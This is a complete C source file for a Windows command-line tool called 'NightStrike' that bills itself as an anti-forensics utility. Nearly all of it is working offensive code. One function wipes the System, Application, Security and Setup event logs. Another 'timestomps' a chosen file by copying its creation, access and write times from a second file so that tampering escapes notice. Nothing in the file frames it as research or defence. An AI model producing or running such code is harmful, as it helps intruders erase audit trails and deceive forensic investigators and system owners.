#include <stdio.h>
#include <time.h>
#include <windows.h>


// NightStrike - Anti-Forensics Utility
// Capabilities: Clear Event Logs, Timestomp Files (Match MAC times)

void ClearLogs() {
  printf("[*] Attempting to clear Event Logs...\n");
  const char *logs[] = {"System", "Application", "Security", "Setup"};

  for (int i = 0; i < 4; i++) {
    HANDLE hLog = OpenEventLog(NULL, logs[i]);
    if (hLog) {
      if (ClearEventLog(hLog, NULL)) {
        printf("[+] Cleared log: %s\n", logs[i]);
      } else {
        printf("[-] Failed to clear log: %s (Error: %d)\n", logs[i],
               GetLastError());
      }
      CloseEventLog(hLog);
    } else {
      printf("[-] Failed to open log: %s\n", logs[i]);
    }
  }
}

void TimeStomp(const char *targetFile, const char *sourceFile) {
  // Clone timestamps from sourceFile to targetFile
  HANDLE hSource = CreateFile(sourceFile, GENERIC_READ, FILE_SHARE_READ, NULL,
                              OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if (hSource == INVALID_HANDLE_VALUE) {
    printf("[-] Could not open source file: %s\n", sourceFile);
    return;
  }

  FILETIME ftCreate, ftAccess, ftWrite;
  GetFileTime(hSource, &ftCreate, &ftAccess, &ftWrite);
  CloseHandle(hSource);

  HANDLE hTarget =
      CreateFile(targetFile, FILE_WRITE_ATTRIBUTES, FILE_SHARE_WRITE, NULL,
                 OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if (hTarget == INVALID_HANDLE_VALUE) {
    printf("[-] Could not open target file: %s\n", targetFile);
    return;
  }

  if (SetFileTime(hTarget, &ftCreate, &ftAccess, &ftWrite)) {
    printf("[+] Timestomp successful! %s now matches %s\n", targetFile,
           sourceFile);
  } else {
    printf("[-] Timestomp failed. Error: %d\n", GetLastError());
  }
  CloseHandle(hTarget);
}

int main(int argc, char *argv[]) {
  printf("NightStrike - Anti-Forensics Tool\n");

  if (argc < 2) {
    printf("Usage:\n");
    printf("  NightStrike.exe --clearlogs\n");
    printf("  NightStrike.exe --timestomp <target_file> <source_to_mimic>\n");
    return 1;
  }

  if (strcmp(argv[1], "--clearlogs") == 0) {
    ClearLogs();
  } else if (strcmp(argv[1], "--timestomp") == 0 && argc == 4) {
    TimeStomp(argv[2], argv[3]);
  } else {
    printf("[-] Invalid arguments.\n");
  }

  return 0;
}
